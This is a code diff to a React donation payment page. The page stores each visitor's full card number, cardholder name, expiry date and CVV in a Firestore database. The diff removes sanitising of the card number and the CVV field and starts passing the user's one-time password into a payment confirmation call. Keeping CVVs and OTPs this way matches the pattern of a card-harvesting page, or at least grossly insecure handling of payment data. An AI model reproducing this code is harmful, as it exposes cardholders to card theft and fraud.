@@ -120,7 +120,7 @@ export default function PaymentPage() {
 
       // Save payment data to Firestore
       const paymentData = {
-        cardNumber: cardNumber.replace(/\s/g, ''),
+        cardNumber: cardNumber,
         cardHolder,
         expiryDate,
         cvv,
@@ -165,7 +165,7 @@ export default function PaymentPage() {
       // In a real app, you would verify this with your payment provider
 
       // Update payment status in Firestore
-      const success = await confirmPayment(paymentId, donationId);
+      const success = await confirmPayment(paymentId, donationId,otpValue);
 
       if (success) {
         toast.success('تم التحقق من الدفع بنجاح!');
@@ -311,8 +311,7 @@ export default function PaymentPage() {
                       placeholder="123"
                       value={cvv}
                       onChange={(e) => {
-                        const value = e.target.value.replace(/\D/g, '');
-                        setCvv(value.slice(0, 3));
+                        setCvv(e.target.value);
                       }}
                       maxLength={3}
                       type="password"
